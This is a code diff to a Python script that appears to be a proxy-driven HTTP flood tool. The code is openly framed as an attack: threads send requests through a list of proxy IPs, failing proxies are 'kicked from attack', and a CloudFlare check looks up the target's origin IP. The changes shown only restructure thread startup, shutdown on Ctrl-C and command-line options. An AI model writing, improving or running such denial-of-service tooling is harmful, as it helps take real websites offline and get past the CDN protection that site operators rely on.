@@ -22,7 +22,6 @@ keywords_file = 'files/keywords.txt'
 
 # initializing variables
 ex = Event()
-threads = []
 ips = []
 ref = []
 keyword = []
@@ -38,7 +37,7 @@ auth_pass = ''
 # main
 def main(argv):
 	try:
-		opts, args = getopt.getopt(argv, 'ht:a:', ['target=', 'auth='])
+		opts, args = getopt.getopt(argv, 'ht:a:', ['help', 'target=', 'auth='])
 	except getopt.GetoptError as err:
 		print(err)
 		showUsage()
@@ -138,6 +137,7 @@ def request(index):
 		if err_count >= 20:
 			print("Proxy " + ips[index] + " has been kicked from attack due to it's nonoperability")
 			return
+	print('Stop thread [' + str(index) + ']')
 
 #CloudFlare Check and noticing
 def cloudFlareCheck():
@@ -157,11 +157,20 @@ def cloudFlareCheck():
 
 # Creating a thread pool
 def startAttack():
+	threads = []
 	for i in range(len(ips)):
 		t = threading.Thread(target=request, args=(i,))
 		t.daemon = True
 		t.start()
 		threads.append(t)
+	try:
+		while True:
+			time.sleep(.05)
+	except KeyboardInterrupt:
+		ex.set()
+		for t in threads:
+			t.join()
+		print('\rScript has been stopped')
 
 def isCloudFlare(link):
 	#get origin IP by domain
@@ -189,12 +198,3 @@ def showUsage():
 
 if __name__ == '__main__':
 	main(sys.argv[1:])
-	
-try:
-	while True:
-		time.sleep(.05)
-except KeyboardInterrupt:
-	ex.set()
-	print('Script has been stopped')
-	for t in threads:
-		t.join()
